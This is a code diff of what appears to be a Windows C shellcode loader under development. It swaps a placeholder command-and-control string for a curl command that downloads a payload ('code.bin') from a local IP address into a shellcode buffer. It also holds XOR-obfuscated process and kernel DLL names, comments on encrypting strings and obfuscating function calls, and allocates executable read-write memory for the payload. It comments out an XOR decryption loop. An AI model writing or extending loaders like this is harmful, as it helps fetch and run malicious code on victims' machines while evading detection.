@@ -24,7 +24,7 @@ int main(void)
 	unsigned char procName[] = "\x25\x1a\x01\x07\x06\x12\x1f\x32\x1f\x1f\x1c\x10\x73";
 	unsigned char kernel[] = "\x18\x16\x01\x1d\x16\x1f\x40\x41\x5d\x17\x1f\x1f\x73";
 	// Pointer to command
-	char * command = "curl http://comandcontrolserverfile";
+	char * command = "curl http://192.168.0.134/code.bin";
 	// Buffer to store the shellcode piped from command.
 	unsigned char shellcode[460];
 	// Buffer to store one byte piped from command to shellcode buffer
@@ -68,10 +68,10 @@ int main(void)
 
 VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime)
 {
-	for (int i = 0; i < g_context.payloadSize - 1; i++)
-	{
-		g_context.payload[i] = g_context.payload[i]^g_context.key;
-	}
+	// for (int i = 0; i < g_context.payloadSize - 1; i++)
+	// {
+	// 	g_context.payload[i] = g_context.payload[i]^g_context.key;
+	// }
 	// Encrypt DLL and function strings. 
 	// Obfuscate function calls - using DLL pointer.
     void * payload_mem = pAllocate(NULL, g_context.payloadSize , MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
